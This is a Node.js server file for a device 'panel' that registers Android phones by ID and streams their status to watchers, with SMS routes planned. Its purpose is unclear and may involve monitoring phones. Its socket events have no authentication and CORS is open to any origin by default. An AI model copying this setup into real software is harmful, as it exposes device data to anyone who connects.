/**
 * webrtochallan-style stack: Express REST + Mongoose + Socket.IO (+ optional Change Streams).
 *
 * Not wired into the Vite app yet — next step: add JWT/session auth, more routes (sms, settings),
 * then replace src/lib/rtdbPb + pocketbase with fetch + socket.io-client.
 *
 * MongoDB Change Streams need a replica set (e.g. MongoDB Atlas). On standalone local Mongo,
 * watch() may fail; the API still works.
 */
import "dotenv/config";
import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";
import deviceRoutes from "./routes/deviceRoutes.js";
import rtdbRoutes from "./routes/rtdbRoutes.js";
import authRoutes from "./routes/authRoutes.js";
import Device from "./models/Device.js";
import { initAdminPassword } from "./controllers/authController.js";

const PORT = Number(process.env.PORT) || 5050;
const CORS_ORIGIN = process.env.CORS_ORIGIN || "*";

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: { origin: CORS_ORIGIN === "*" ? true : CORS_ORIGIN.split(",").map((s) => s.trim()), methods: ["GET", "POST"] },
});

app.use(cors({ origin: CORS_ORIGIN === "*" ? true : CORS_ORIGIN.split(",").map((s) => s.trim()) }));
app.use(express.json({ limit: "2mb" }));
app.set("io", io);

app.get("/", (_req, res) => {
  res.type("text").send("sanjhi-panel-server ok");
});

app.use("/api/devices", deviceRoutes);
app.use("/api/rtdb", rtdbRoutes);
app.use("/api/auth", authRoutes);

const watchers = new Map();

function notifyWatchers(deviceId, payload) {
  const set = watchers.get(deviceId);
  if (!set) return;
  for (const sid of set) {
    io.to(sid).emit("deviceRealtime", payload);
  }
}

io.on("connection", (socket) => {
  socket.on("watchDevice", (rawId) => {
    const id = String(rawId || "").trim();
    if (!id) return;
    if (!watchers.has(id)) watchers.set(id, new Set());
    watchers.get(id).add(socket.id);
  });

  socket.on("unwatchDevice", (rawId) => {
    const id = String(rawId || "").trim();
    if (!id || !watchers.has(id)) return;
    watchers.get(id).delete(socket.id);
  });

  socket.on("registerDevice", (rawId) => {
    const id = String(rawId || "").trim();
    if (!id) return;
    socket.join(id);
    socket.emit("deviceRegistered", { android_id: id });
    io.emit("deviceStatus", { android_id: id, connectivity: "Online", updatedAt: new Date() });
    notifyWatchers(id, { type: "status", android_id: id, connectivity: "Online" });
  });

  socket.on("disconnect", () => {
    for (const [, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

function startWatch() {
  try {
    const stream = Device.watch();
    stream.on("change", async (chg) => {
      if (!["insert", "update", "replace"].includes(chg.operationType)) return;
      const doc = await Device.findById(chg.documentKey._id).lean();
      if (!doc?.android_id) return;
      io.emit("deviceUpdateGlobal", doc);
      io.to(doc.android_id).emit("deviceUpdate", doc);
      notifyWatchers(doc.android_id, { type: "device", ...doc });
    });
    stream.on("error", () => {
      console.warn("[Device.watch] stream error — needs replica set?");
    });
    console.log("Mongo Change Stream: devices");
  } catch (e) {
    console.warn("[Device.watch] not started:", e.message);
  }
}

httpServer.listen(PORT, () => {
  console.log(`sanjhi-panel-server http://localhost:${PORT}`);
});

async function connectWithRetry() {
  const retryMs = 10000;
  try {
    await connectDB();
    await initAdminPassword();
    startWatch();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error(`[db] connect failed: ${msg}`);
    console.error(`[db] retrying in ${retryMs / 1000}s...`);
    setTimeout(() => {
      void connectWithRetry();
    }, retryMs);
  }
}

void connectWithRetry();
